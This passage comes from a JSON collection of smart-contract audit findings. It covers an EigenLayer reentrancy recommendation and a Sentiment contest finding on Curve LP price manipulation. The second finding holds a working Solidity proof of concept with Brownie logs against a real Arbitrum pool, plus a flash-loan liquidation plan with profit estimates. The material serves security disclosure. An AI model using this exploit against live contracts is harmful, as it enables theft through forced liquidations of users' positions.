strategy’s `deposit` function occur later, this might look safe. However, if the deposit happens via `StrategyManager.depositIntoStrategyWithSignature`, then it can be seen, for example, that the staker’s nonce is updated before the internal `_depositIntoStrategy` function is called:\n\n\n**src/contracts/core/StrategyManager.sol:L244-L286**\n\n\n\n```\nfunction depositIntoStrategyWithSignature(\n    IStrategy strategy,\n    IERC20 token,\n    uint256 amount,\n    address staker,\n    uint256 expiry,\n    bytes memory signature\n)\n    external\n    onlyWhenNotPaused(PAUSED\\_DEPOSITS)\n    onlyNotFrozen(staker)\n    nonReentrant\n    returns (uint256 shares)\n{\n    require(\n        expiry >= block.timestamp,\n        \"StrategyManager.depositIntoStrategyWithSignature: signature expired\"\n    );\n    // calculate struct hash, then increment `staker`'s nonce\n    uint256 nonce = nonces[staker];\n    bytes32 structHash = keccak256(abi.encode(DEPOSIT\\_TYPEHASH, strategy, token, amount, nonce, expiry));\n    unchecked {\n        nonces[staker] = nonce + 1;\n    }\n    bytes32 digestHash = keccak256(abi.encodePacked(\"\\x19\\x01\", DOMAIN\\_SEPARATOR, structHash));\n\n\n    /\\*\\*\n \\* check validity of signature:\n \\* 1) if `staker` is an EOA, then `signature` must be a valid ECSDA signature from `staker`,\n \\* indicating their intention for this action\n \\* 2) if `staker` is a contract, then `signature` must will be checked according to EIP-1271\n \\*/\n    if (Address.isContract(staker)) {\n        require(IERC1271(staker).isValidSignature(digestHash, signature) == ERC1271\\_MAGICVALUE,\n            \"StrategyManager.depositIntoStrategyWithSignature: ERC1271 signature verification failed\");\n    } else {\n        require(ECDSA.recover(digestHash, signature) == staker,\n            \"StrategyManager.depositIntoStrategyWithSignature: signature not from staker\");\n    }\n\n    shares = \\_depositIntoStrategy(staker, strategy, token, amount);\n}\n\n```\nHence, querying the staker’s nonce in reentrancy would still give a result based on an “incomplete state change.” It is, for example, conceivable that the staker still has zero shares, and yet their nonce is already 1. This particular situation is most likely not an issue, but the example shows that reentrancy can be subtle.\n\n\n#### Recommendation\n\n\nThis is fine if the token doesn’t allow reentrancy in the first place. As discussed above, among the tokens that do allow reentrancy, some variants of when reentrancy can happen in relation to state changes in the token seem more dangerous than others, but we have also argued that this kind of reasoning can be dangerous and error-prone. Hence, we recommend employing comprehensive and defensive reentrancy protection based on reentrancy guards such as OpenZeppelin’s ReentrancyGuardUpgradeable, which is already used in the `StrategyManager`.\n\n\nUnfortunately, securing a multi-contract system against reentrancy can be challenging, but we hope the preceding discussion and the following pointers will prove helpful:\n\n\n1. External functions in strategies that should only be callable by the strategy manager (such as `deposit` and `withdraw`) should have the `onlyStrategyManager` modifier. This is already the case in the current codebase and is listed here only for completeness.\n2. External functions in strategies for which item 1 doesn’t apply (such as `sharesToUnderlying` and `underlyingToShares`) should query the strategy manager’s reentrancy lock and revert if it is set.\n3. In principle, the restrictions above also apply to `public` functions, but if a `public` function is also used internally, checks against reentrancy can cause problems (if used in an internal context) or at least be redundant. In the context of reentrancy protection, it is often easier to split public functions into an `internal` and an `external` one.\n4. If `view` functions are supposed to give reliable results (either internally – which is typically the case – or for other contracts), they have to be protected too.\n5. The previous item also applies to the `StrategyManager`: `view` functions that provide correct results should query the reentrancy lock and revert if it is set.\n6. Solidity automatically generates getters for `public` state variables. Again, if these (`external view`) functions must deliver correct results, the same measures must be taken for explicit `view` functions. In practice, the state variable has to become `internal` or `private`, and the getter function must be hand-written.\n7. The `StrategyBase` contract provides some basic functionality. Concrete strategy implementations can inherit from this contract, meaning that some functions may be overridden (and might or might not call the overridden version via `super`), and new functions might be added. While the guidelines above should be helpful, derived contracts must be reviewed and assessed separately on a case-by-case basis. As mentioned before, reentrancy protection can be challenging, especially in a multi-contract system.",
+      "summary": "\nThis bug report discusses the potential vulnerability of the `StrategyBase` contract to a token contract that employs some sort of callback to a function like `sharesToUnderlyingView`, before the balance change is reflected in the contract. This could lead to an incorrect return value from `sharesToUnderlyingView`. To protect the contract from reentrancy, it is recommended to employ comprehensive and defensive reentrancy protection based on reentrancy guards such as OpenZeppelin’s ReentrancyGuardUpgradeable, which is already used in the `StrategyManager`. Additionally, external functions in strategies that should only be callable by the strategy manager should have the `onlyStrategyManager` modifier, and external functions in strategies for which this does not apply should query the strategy manager’s reentrancy lock and revert if it is set. Furthermore, `view` functions that provide correct results should query the reentrancy lock and revert if it is set. Finally, if `public` functions are also used internally, checks against reentrancy can cause problems (if used in an internal context) or at least be redundant. All of these measures should be taken to ensure the security of the contract.",
+      "report_date": {},
+      "contest_prize_txt": "",
+      "contest_link": "",
+      "sponsor_name": "",
+      "sponsor_link": "",
+      "quality_score": 4,
+      "general_score": 2,
+      "source_link": "https://consensys.net/diligence/audits/2023/03/eigenlabs-eigenlayer/",
+      "github_link": "",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "",
+      "slug": "potential-reentrancy-into-strategies-consensys-eigenlabs-eigenlayer-markdown",
+      "firm_name": "ConsenSys",
+      "firm_logo_square": "consensys_square.png",
+      "protocol_name": "EigenLabs — EigenLayer",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "ConsenSys",
+        "logo_square": "consensys_square.png"
+      },
+      "protocols_protocol": {
+        "name": "EigenLabs — EigenLayer",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Launchpad"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Read-only Reentrancy"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Reentrancy"
+          }
+        }
+      ]
+    },
+    {
+      "id": "5643",
+      "kind": "GIT",
+      "auditfirm_id": "3",
+      "impact": "HIGH",
+      "finders_count": 2,
+      "protocol_id": "89",
+      "title": "H-1: H-01 wstETH-ETH Curve LP Token Price can be manipulated to Cause Unexpected Liquidations",
+      "content": "Source: https://github.com/sherlock-audit/2022-12-sentiment-judging/issues/7 \n\n## Found by \nBahurum, GalloDaSballo\n\n## Summary\n\nThe wsteETH-ETH LP token is priced via it's [`virtual_price`](https://github.com/sherlock-audit/2022-12-sentiment/blob/main/oracle/src/curve/StableCurveEthOracle.sol#L72)\n\nThrough what [Chainalysis called View only Reentrancy](https://chainsecurity.com/heartbreaks-curve-lp-oracles/), we can reduce the value of `virtual_price`, causing the RiskEngine to trigger a liquidation event.\n\n## Vulnerability Detail\n\nPer some testing I made, we know that the Debt for such an account will be denominated in WETH, this price cannot be tampered.\n\nHowever, the price of the ETH-wstETH LP Token can be manipulated by calling the RiskEngine while reEntering from the `POOL.remove_liquidity` function.\n\nThis is possible because the function will send ETH first, before updating it's internal wstETH balances.\n\nTo test the maximum impact I simulated borrowing an infinite amount of WETH (by impersonating the GMX Vault).\n\nIf that amount of ETH were available on Arbitrum, we can achieve over 10x in price suppression, effectively making any \"normal\" account instantly liquidatable.\n\nThe estimated cost of the attack is 60 BPS of the total ETH used (due to price impact)\n\n## Impact\n\nBecause of the price manipulation, we can trigger unfair liquidations to our advantage, because the cost of manipulation is in the 50BPS range, any time a big enough deposit is made, it becomes profitable to force liquidate them.\n\nIn the theoretical scenario shown below (borrowing from GMX Vault), I can effectively liquidate any account using the token.\nA more pragmatic scenario is listed below as well\n\n## Code Snippet\n\nBelow a simulation showing how to achieve the Virtual Price Manipulation, the last piece of the attack would be to call liquidate on an account while re-entering\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.10;\n\n\nimport {IERC20} from \"@oz/token/ERC20/IERC20.sol\";\nimport {SafeERC20} from \"@oz/token/ERC20/utils/SafeERC20.sol\";\nimport {ReentrancyGuard} from \"@oz/security/ReentrancyGuard.sol\";\n\ninterface IAccount {\n  function getAssets() external view returns (address[] memory);\n  function getBorrows() external view returns (address[] memory);\n}\ninterface IRiskEngine {\n  function getBalance(address account) external view returns (uint);\n  function getBorrows(address account) external view returns (uint);\n}\n\ninterface ISentimentCore {\n  function riskEngine() external view returns (address);\n}\n\ninterface ICurvePool {\n  function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);\n  function remove_liquidity(uint256 amount, uint256[2] memory min_amounts) external returns (uint256);\n  function get_virtual_price() external view returns (uint256);\n}\n\ninterface ILP {\n  function balanceOf(address) external view returns (uint256);\n}\n\ncontract VirtualPriceManip {\n  ICurvePool POOL = ICurvePool(0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80);\n  ILP LP = ILP(0xDbcD16e622c95AcB2650b38eC799f76BFC557a0b);\n  ILP WSTETH = ILP(0x5979D7b546E38E414F7E9822514be443A4800529);\n  // Get WETH\n\n  // Check Virtual Price\n\n  // Deposit into Curve\n\n  // Check Virtual Price\n\n  // Withdraw, and ReEnter\n\n  // Check Virtual Price\n\n  // End, Check Virtual Price\n\n  event Debug(string name, uint256 value);\n\n  function fakeSentimentPrice() internal returns (uint256){\n    uint256 FAKE_WETH_PRICE = 1e18;\n    return FAKE_WETH_PRICE * POOL.get_virtual_price() / 1e18;\n  }\n\n  function startAttack() external payable {\n    uint256 amt = msg.value;\n\n    // 1. Check Virtual Price\n    emit Debug(\"Virtual Price 1\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 1\", fakeSentimentPrice());\n\n    // 2. Curve deposit\n    uint256[2] memory dep = [amt, 0];\n    POOL.add_liquidity{value: amt}(dep, 1);\n\n    // 3. Check Virtual Price\n    emit Debug(\"Virtual Price 3\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 3\", fakeSentimentPrice());\n\n    // 4. Curve Withdraw\n    // TODO: This is where profit maximization math will be necessary\n    uint256[2] memory dep2 = [uint256(0), uint256(0)];\n    POOL.remove_liquidity(LP.balanceOf(address(this)), dep2);\n\n    // 6. Check Virtual Price\n    emit Debug(\"Virtual Price 6\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 6\", fakeSentimentPrice());\n\n    // TODO: Check loss in ETH and compare vs wstETH we now have\n    // Loss is there, but should be marginal / imbalance + fees\n    emit Debug(\"Msg.value\", msg.value);\n    emit Debug(\"This Balance\", address(this).balance);\n    emit Debug(\"Delta\", msg.value - address(this).balance);\n\n    emit Debug(\"WstEthBalance\", WSTETH.balanceOf(address(this)));\n  }\n\n  receive() external payable {\n    // 5. Reenter here\n\n    // Check Virtual Price\n    emit Debug(\"Virtual Price 5\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 5\", fakeSentimentPrice());\n  }\n}\n```\n\nHere the Brownie Console for the maximum theoretical attack\n\n```python\n\nweth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\nwhale = accounts.at(\"0x489ee077994b6658eafa855c308275ead8097c4a\", force=True)\n \nweth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\nweth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\nc = VirtualPriceManip.deploy({\"from\": a[0]})\nc.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\n \nFetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\nFetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\nTransaction sent: 0x69a4ee6fba72894d2e6c7ba556a6df8bb2159981e09b7dd947283368628baefa\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  TransparentUpgradeableProxy.transfer confirmed   Block: 42567825   Gas used: 39080 (0.20%)\n\nTransaction sent: 0xfecb0db00b3db0b7b6cf22bc1adc92d16169060ead3a9c13f88a19b0c57fd666\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n  TransparentUpgradeableProxy.withdraw confirmed   Block: 42567826   Gas used: 30937 (0.15%)\n\nTransaction sent: 0x198d4b73e7def112903606efa77c0add9910e7f3e86186e310a0adbfec0adebc\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  VirtualPriceManip.constructor confirmed   Block: 42567827   Gas used: 647070 (3.24%)\n  VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n\nTransaction sent: 0x101e212ca64ed3fc6595c15c30706a8075a010ed866ba5b230cb494f9ac20c5c\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n  VirtualPriceManip.startAttack confirmed   Block: 42567828   Gas used: 354622 (1.77%)\n\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1005466150529603227)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1005466150529603227)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1005678057072654996)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1005678057072654996)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 93457469619424556)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 93457469619424556)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1005678057072654996)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1005678057072654996)]), OrderedDict([('name', 'Msg.value'), ('value', 86826027227418610000000)]), OrderedDict([('name', 'This Balance'), ('value', 83541864626282883099978)]), OrderedDict([('name', 'Delta'), ('value', 3284162601135726900022)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2736183720644597163208)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 81436145961234587181162)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2736183720644597163208)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 81436145961234587181162)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (86826027227418610000000, 0)), ('fees', (11884971933620921875, 9942362504203593908)), ('invariant', 86698045640581035174753), ('token_supply', 86190407433150506590178)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (83541864626282883099978, 2736183720644597163208)), ('fees', (0, 0)), ('token_supply', 4754261471915919409016)])]}\n\n\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n>>> eth_to_convert = 2736183720644597163208 * 1.08\n>>> 3284162601135726900022 - eth_to_convert\n3.290841828395613e+20\n>>> 3.290841828395613e+20 / 86826027227418610000000 * 100\n## 37 BPS to perform the attack, remaining costs would bring it up to around 50 BPS (swap wstETH, cost of liquidations, etc..)\n0.3790155939964975\n\n## See `fakeSentiment5 vs fakeSentimen1`\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n\n\"\"\"\nPrice is 9% of it's original value, we achieve a 10X price depreciation, allowing us to liquidate any user that has taken minimal leverage\n\"\"\"\n\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAt this time, I would recommend NOT to use the ETH-stETH LP Token as the price is manipulatable.\nThe only rational way I could expect this to be solved is for Chainlink to offer virtual_price oracles, or the development of a TWAP for the virtual_price.\n\n\n## Additional Considerations\n\nThe theoretical maximum attack allows to effectively liquidate any account that uses the stETH-WETH Pool.\n\nIn practice, via an AAVE Flashloan I'm able to borrow up to 14.5k WETH, which allows to move the price by over 11%, meaning that some accounts, that are levered at around 90% could be unfairly liquidated.\n\n```python\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1005466094471744332)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1005466094471744332)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1005497298777214105)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1005497298777214105)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 890315892210177531)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 890315892210177531)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1005497298777214105)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1005497298777214105)]), OrderedDict([('name', 'Msg.value'), ('value', 1452330000000000000000)]), OrderedDict([('name', 'This Balance'), ('value', 713314090131700921245)]), OrderedDict([('name', 'Delta'), ('value', 739015909868299078755)]), OrderedDict([('name', 'WstEthBalance'), ('value', 677574531693017948098)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('_value', 1449753409949781400798)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('value', 677574531693017948098)]), OrderedDict([('_from', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 1449753409949781400798)])], 'AddLiquidity': [OrderedDict([('provider', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('token_amounts', (1452330000000000000000, 0)), ('fees', (192842135570862938, 176890872766115807)), ('invariant', 6238313797265075968081), ('token_supply', 6204014881865700809814)])], 'RemoveLiquidity': [OrderedDict([('provider', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('token_amounts', (713314090131700921245, 677574531693017948098)), ('fees', (0, 0)), ('token_supply', 4754261471915919409016)])]}\n>>> 890315892210177531 / 1005466094471744332\n## Around 11.2% Price Manipulation with 14.5k ETH used\n0.8854757978467043\n```\n\nTo put it in simple terms, the cost of this attack is around $90k and it will be profitable to liquidate any position above $100k\n\n## Discussion\n\n**Evert0x**\n\nComment from WatchPug (lead senior)\n\n> We find the issue to be valid.\n> \n> However, the economics of the attack may not be profitable, and the preconditions and requirements for such an attack can be narrow. We also believe that flashloans cannot be utilized as the entrance for the attack: `POOL.remove_liquidity()` will add a reentrancy lock which prevents `remove_liquidity()` on the liquidation impounded lpToken assets.\n> \n> As the revenue/profit from such an attack cannot be used to repay the loan within the same block, flashloans cannot be used.\n\nAlthough the impact is high we judge the issue to be medium severity because of the requirements and conditions described in the comment from WatchPug.\n\n\n**bahurum**\n\nEscalate for 50 USDC. \nI believe the issue has been downgraded incorrectly to medium severity. The lead senior watson justifies the downgrading with 2 arguments, which I would like to dispute both.\n1. **The attack may not be profitable and needs narrow preconditions**: The attack is profitable as in the `Additional Considerations` section, the watson shows by mistake the impact of a 1452 ETH loan instead of 14520 ETH flash-borrowable from Aave on arbitrum (see 'Msg.value' field in debug log). With 14.5k ETH the virtual price would be reduced by 45%, which is much more than 11%. Any account holding a substantial amount of this curve LP and with risky margin will be liquidated (for example if 50 % of collateral is WstETH-ETH curve LP and margin is 20% it will be liquidated). Here is a realistic attack scenario:\n   - The accounts holding the LP token amount to 2M $ in total value and half of them (1M $ value) can be liquidated with 40% manipulation of the LP price\n   - Attacker flash borrows 14k WETH (17M $) and converts to ETH\n   - Attacker calls `add_liquidity` with 16M $ worth of ETH, keeps 1M $ for liquidations\n   - Attacker calls `remove_liquidity` with all LP obtained\n   - On reentrant call:\n        - swaps 1M $ for the required tokens needed for liquidation\n        - liquidates accounts and gets an average liquidation premium of at least 20%, so 200k $ in total\n    - Exit call to attacker's `fallback` or `receive` function\n    - Execution of call to `remove_liquidity` resumes and finishes\n     - Attacker swaps 200k $ worth of stolen tokens back to ETH. Note that WstETH-ETH LP stolen can also be swapped back to ETH since the call to `remove_liquidity` is already exited.\n   - Repay the flashloan and profit. Cost of pool imbalanace + loan is around 0.5 % as shown in the PoC, so about 85k $. Profit is at least 100k $ in this scenario. The attacker doesn't need to provide any funds up front.\n2.  **flashloans cannot be utilized as the entrance for the attack**: This is not true since the WstETH-ETH LP tokens are sent to the attacker during liquidation, which occurs during the call to `remove_liquidity`, but they can be swapped back to ETH after the end of the call to `remove_liquidity` and before the end of the tx. So there is no reentrancy in `remove_liquidity` in this attack. See the scenario above.\n\nIn addition, this bug is well known and probably calls to the pool's `get_virtual_price` are being scanned to find vulnerable contracts, so black hats would have noticed the bug very soon.\n\nFinally, and not related to the escalation, I would like to suggest again a fix as I made some confusion when I suggested it in my own submission:\n\n```diff\n    function getPrice(address token) external view returns (uint) {\n        ICurvePool pool = ICurveLP(token).minter();\n+       uint256[2] calldata amounts;\n+       pool.remove_liquidity(0, amounts);\n        address coin;\n        uint price;\n        uint minPrice = oracleFacade.getPrice(WETH);\n        for(uint i; i<N_COINS; i++) {\n            coin = pool.coins(i);\n            if (coin != ETH) {\n                price = oracleFacade.getPrice(coin);\n                minPrice = (price < minPrice) ? price : minPrice;\n            }\n        }\n\n        return minPrice.mulWadDown(pool.get_virtual_price());\n    }\n```\n\n**sherlock-admin**\n\n > Escalate for 50 USDC. \n> I believe the issue has been downgraded incorrectly to medium severity. The lead senior watson justifies the downgrading with 2 arguments, which I would like to dispute both.\n> 1. **The attack may not be profitable and needs narrow preconditions**: The attack is profitable as in the `Additional Considerations` section, the watson shows by mistake the impact of a 1452 ETH loan instead of 14520 ETH flash-borrowable from Aave on arbitrum (see 'Msg.value' field in debug log). With 14.5k ETH the virtual price would be reduced by 45%, which is much more than 11%. Any account holding a substantial amount of this curve LP and with risky margin will be liquidated (for example if 50 % of collateral is WstETH-ETH curve LP and margin is 20% it will be liquidated). Here is a realistic attack scenario:\n>    - The accounts holding the LP token amount to 2M $ in total value and half of them (1M $ value) can be liquidated with 40% manipulation of the LP price\n>    - Attacker flash borrows 14k WETH (17M $) and converts to ETH\n>    - Attacker calls `add_liquidity` with 16M $ worth of ETH, keeps 1M $ for liquidations\n>    - Attacker calls `remove_liquidity` with all LP obtained\n>    - On reentrant call:\n>         - swaps 1M $ for the required tokens needed for liquidation\n>         - liquidates accounts and gets an average liquidation premium of at least 20%, so 200k $ in total\n>     - Exit call to attacker's `fallback` or `receive` function\n>     - Execution of call to `remove_liquidity` resumes and finishes\n>      - Attacker swaps 200k $ worth of stolen tokens back to ETH. Note that WstETH-ETH LP stolen can also be swapped back to ETH since the call to `remove_liquidity` is already exited.\n>    - Repay the flashloan and profit. Cost of pool imbalanace + loan is around 0.5 % as shown in the PoC, so about 85k $. Profit is at least 100k $ in this scenario. The attacker doesn't need to provide any funds up front.\n> 2.  **flashloans cannot be utilized as the entrance for the attack**: This is not true since the WstETH-ETH LP tokens are sent to the attacker during liquidation, which occurs during the call to `remove_liquidity`, but they can be swapped back to ETH after the end of the call to `remove_liquidity` and before the end of the tx. So there is no reentrancy in `remove_liquidity` in this attack. See the scenario above.\n> \n> In addition, this bug is well known and probably calls to the pool's `get_virtual_price` are being scanned to find vulnerable contracts, so black hats would have noticed the bug very soon.\n> \n> Finally, and not related to the escalation, I would like to suggest again a fix as I made some confusion when I suggested it in my own submission:\n> \n> ```diff\n>     function getPrice(address token) external view returns (uint) {\n>         ICurvePool pool = ICurveLP(token).minter();\n> +       uint256[2] calldata amounts;\n> +       pool.remove_liquidity(0, amounts);\n>         address coin;\n>         uint price;\n>         uint minPrice = oracleFacade.getPrice(WETH);\n>         for(uint i; i<N_COINS; i++) {\n>             coin = pool.coins(i);\n>             if (coin != ETH) {\n>                 price = oracleFacade.getPrice(coin);\n>                 minPrice = (price < minPrice) ? price : minPrice;\n>             }\n>         }\n> \n>         return minPrice.mulWadDown(pool.get_virtual_price());\n>     }\n> ```\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**GalloDaSballo**\n\nEscalate for 50 USDC.\nIn solidarity to my colleague, I re-ran my POC with whale being set to [aWETH](https://arbiscan.io/address/0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8) and you can see that the price impact is closer to 50%\n\n```python\n>>> weth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\nwhale = accounts.at(\"0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8\", force=True)\nFetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\nFetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\n>>> weth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\nweth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\nc = VirtualPriceManip.deploy({\"from\": a[0]})\nc.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\nTransaction sent: 0x986059eea98f64537fc18f576080d9df04a3b1d14566f3f11106d1f443c2a62e\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  TransparentUpgradeableProxy.transfer confirmed   Block: 45350953   Gas used: 39080 (0.20%)\n\nTransaction sent: 0x3aa0e109cf7f7983b6c4123a8befacda921f93969c7f1185e9175d2ad9bfc44c\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n  TransparentUpgradeableProxy.withdraw confirmed   Block: 45350954   Gas used: 30937 (0.15%)\n\nTransaction sent: 0xe4df2473de3a73a7a56b17cdf5acec0cd523f713fcfbbe80a40261f6519a74a3\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  VirtualPriceManip.constructor confirmed   Block: 45350955   Gas used: 647058 (3.24%)\n  VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n\nTransaction sent: 0xa3f759c1c16dffa1dfdc90faceb384d37aa462de39d01dc73ec55ac909f2d27d\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n  VirtualPriceManip.startAttack confirmed   Block: 45350956   Gas used: 346696 (1.73%)\n\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Msg.value'), ('value', 9242544511373299000000)]), OrderedDict([('name', 'This Balance'), ('value', 6887807551730873474275)]), OrderedDict([('name', 'Delta'), ('value', 2354736959642425525725)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2124028976089901491510)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 9136530630863310092133)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2124028976089901491510)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 9136530630863310092133)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (9242544511373299000000, 0)), ('fees', (1143210375408757286, 1031913016221942347)), ('invariant', 15635314996650963717127), ('token_supply', 15533814948437161604759)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (6887807551730873474275, 2124028976089901491510)), ('fees', (0, 0)), ('token_supply', 6397284317573851512626)])]}\n```\n\nMore specifically a 43% loss of value, which would put at risk a sizeable group of normally levered users:\n>>> 1006386728989215731 / 566156151085517748\n1.777578018113242\n>>> (1006386728989215731 - 566156151085517748) / 1006386728989215731 * 100\n43.743678769080375\n\nAlso agree with my colleague that once the liquidation is successful, we can exit the re-entered state and then settle once the `POOL.D` is back to normal, allowing for some price impact (60BPS on estimate), but still profiting by a great margin\n\n**sherlock-admin**\n\n > Escalate for 50 USDC.\n> In solidarity to my colleague, I re-ran my POC with whale being set to [aWETH](https://arbiscan.io/address/0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8) and you can see that the price impact is closer to 50%\n> \n> ```python\n> >>> weth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\n> whale = accounts.at(\"0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8\", force=True)\n> Fetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\n> Fetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\n> >>> weth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\n> weth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\n> c = VirtualPriceManip.deploy({\"from\": a[0]})\n> c.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\n> Transaction sent: 0x986059eea98f64537fc18f576080d9df04a3b1d14566f3f11106d1f443c2a62e\n> 